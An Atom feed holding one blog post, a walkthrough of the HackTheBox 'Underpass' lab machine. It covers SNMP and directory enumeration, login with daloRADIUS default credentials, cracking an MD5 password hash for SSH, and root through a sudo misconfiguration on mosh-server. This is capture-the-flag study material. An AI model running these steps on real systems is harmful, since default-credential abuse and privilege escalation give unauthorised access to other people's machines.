<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NUTZH</title>
  
  
  <link href="http://0xdezznutz.github.io/atom.xml" rel="self"/>
  
  <link href="http://0xdezznutz.github.io/"/>
  <updated>2024-12-25T21:14:29.490Z</updated>
  <id>http://0xdezznutz.github.io/</id>
  
  <author>
    <name>NUTZH</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UnderPass</title>
    <link href="http://0xdezznutz.github.io/Underpass/"/>
    <id>http://0xdezznutz.github.io/Underpass/</id>
    <published>2024-12-25T13:36:03.052Z</published>
    <updated>2024-12-25T21:14:29.490Z</updated>
    
    <content type="html"><![CDATA[<p>Hello, today we gonna try to hack the Underpass machine  on hackthebox<br>the first thing is enumerate and see if there is an open port on the target machine<br>for that we gonna use the tool nmap </p><p>i tried to scan the machine in the first but i found just the port 80 and 22 so<br>i tried with to scan UDP ports.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sU 10.10.11.48 -T5</span><br><span class="line">&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST</span><br><span class="line">Warning: 10.10.11.48 giving up on port because retransmission <span class="built_in">cap</span> hit (2).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> underpass.htb (10.10.11.48)</span><br><span class="line">Host is up (0.073s latency).</span><br><span class="line">Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">161/udp open  snmp</span><br><span class="line"> </span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 100.11 seconds</span><br></pre></td></tr></table></figure><p>we find  SNMP port open and SNMP stands for service network management protocol , that port is used<br>monitor and manage the network devices connected over an IP ,</p><p>we gonna use now snmp-check tool that helps us to enumerate the SNMP devices </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">snmp-check 10.10.11.48</span><br><span class="line">&gt;snmp-check v1.9 - SNMP enumerator</span><br><span class="line">Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</span><br><span class="line"></span><br><span class="line">[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community <span class="string">&#x27;public&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] System information:</span><br><span class="line"></span><br><span class="line">  Host IP address               : 10.10.11.48</span><br><span class="line">  Hostname                      : UnDerPass.htb is the only daloradius server <span class="keyword">in</span> the basin!</span><br><span class="line">  Description                   : Linux underpass 5.15.0-126-generic <span class="comment">#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64</span></span><br><span class="line">  Contact                       : steve@underpass.htb</span><br><span class="line">  Location                      : Nevada, U.S.A. but not Vegas</span><br><span class="line">  Uptime snmp                   : 00:49:46.89</span><br><span class="line">  Uptime system                 : 00:49:36.98</span><br><span class="line">  System <span class="built_in">date</span>                   : 2024-12-25 19:21:21.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>interesting, we find a user:steve and the name of Host Underpass.htb<br>daloradius HMMM , lets look for it </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ nmap  -sU 10.10.11.48 -T5</span><br><span class="line">&gt;</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_24-12-25_14-24-00.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:24:00] Starting: daloradius/                                                                                                                  </span><br><span class="line">[14:24:05] 200 -  221B  - /daloradius/.gitignore                            </span><br><span class="line">[14:24:29] 301 -  323B  - /daloradius/app  -&gt;  http://underpass.htb/daloradius/app/</span><br><span class="line">[14:24:35] 200 -   24KB - /daloradius/ChangeLog                             </span><br><span class="line">[14:24:41] 301 -  323B  - /daloradius/doc  -&gt;  http://underpass.htb/daloradius/doc/</span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/docker-compose.yml                    </span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/Dockerfile</span><br><span class="line">[14:24:55] 301 -  327B  - /daloradius/library  -&gt;  http://underpass.htb/daloradius/library/</span><br><span class="line">[14:24:55] 200 -   18KB - /daloradius/LICENSE                               </span><br><span class="line">[14:25:11] 200 -   10KB - /daloradius/README.md                             </span><br><span class="line">[14:25:15] 301 -  325B  - /daloradius/setup  -&gt;  http://underpass.htb/daloradius/setup/</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure><p>try to look for all these files and find something ,<br>lets brute force the directories </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/app </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app_24-12-25_14-33-44.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:33:44] Starting: daloradius/app/                                                                                                              </span><br><span class="line">[14:34:20] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line">[14:35:11] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line">[14:35:11] 302 -    0B  - /daloradius/app/users/  -&gt;  home-main.php         </span><br><span class="line">[14:35:11] 200 -    2KB - /daloradius/app/users/login.php </span><br></pre></td></tr></table></figure><p>WOOW , we find a login page Great , but we need Username lets brute force directories more like &#x2F;doc<br>so i brute forced till i found </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ [14:42:06] Starting: daloradius/doc/install/                                                                                                      </span><br><span class="line">[14:42:55] 200 -    8KB - /daloradius/doc/install/INSTALL                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p>after reading this file i we found the Username and the Password </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5. INSTALLATION COMPLETE</span><br><span class="line"> ------------------------</span><br><span class="line">              Surf to http://yourip/daloradius</span><br><span class="line">              Login:</span><br><span class="line">          username: administrator</span><br><span class="line">          password: radius</span><br></pre></td></tr></table></figure><p>so i tried this administrator:radius and it failed so lets try to brute force the &#x2F;app directory more<br>and hope for something</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/app/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt </span><br><span class="line"> /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app__24-12-25_14-54-26.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:54:26] Starting: daloradius/app/</span><br><span class="line">[14:54:27] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line">[14:54:27] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line">[14:55:10] 301 -  333B  - /daloradius/app/operators  -&gt;  http://underpass.htb/daloradius/app/operators/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> i went to &#x2F;app&#x2F;operators and i tried to access it with the last Username:Password we had and its works<br> we went to management and list users and we find a hashed password so lets try to decode it with crackstation or u can use john the ripper.<br>(type:MD5) 412DD4759978ACFCC81DEAB01B382403:underwaterfriends<br> and lets try to ssh with the username:password we got<br> (btw : the username is svcMosh) </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh svcMosh@10.10.11.48</span><br><span class="line"><span class="comment"># and enter the password : underwaterfriends</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IT WORKS, now we are inside the target machine<br>so u can read the user.flag </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ svcMosh@underpass:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"> 60a620dd37a894c9b.... <span class="comment"># U got this mate </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ svcMosh@underpass:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">  Matching Defaults entries <span class="keyword">for</span> svcMosh on localhost:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">  User svcMosh may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/mosh-server</span><br></pre></td></tr></table></figure><p>after some searching on google or u can read its manual </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ svcMosh@underpass:~<span class="variable">$mosh</span></span><br><span class="line">  Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="built_in">command</span>...]</span><br><span class="line">        --client=PATH        mosh client on <span class="built_in">local</span> machine</span><br><span class="line">                                (default: <span class="string">&quot;mosh-client&quot;</span>)</span><br><span class="line">        --server=COMMAND     mosh server on remote machine <span class="comment"># interesting </span></span><br><span class="line">                                (default: <span class="string">&quot;mosh-server&quot;</span>)</span><br><span class="line"></span><br><span class="line">  svcMosh@underpass:~$ mosh --server=<span class="string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost</span><br></pre></td></tr></table></figure><p>And we are the root , we can read the root file and get this done </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ root@underpass:~# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line">  882f2654c3c9... <span class="comment">#try to find it </span></span><br></pre></td></tr></table></figure><pre><code>            CONGRATULATION </code></pre><p>Summary :</p><p> for me , its my first time scanning UDP ports , and enumerate SNMP  so it was a good experience .<br>   we learn that we need to brute force some directories more and more until we find something that lead us to the target .<br>  Also for the Privesca , it was good to learn about “mosh” command and what used for and a Misconfiguration can lead to a root privileges.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hello, today we gonna try to hack the Underpass machine  on hackthebox&lt;br&gt;the first thing is enumerate and see if there is an open port o</summary>
      
    
    
    
    <category term="ACTIVE MACHINE" scheme="http://0xdezznutz.github.io/categories/ACTIVE-MACHINE/"/>
    
    
  </entry>
  
</feed>
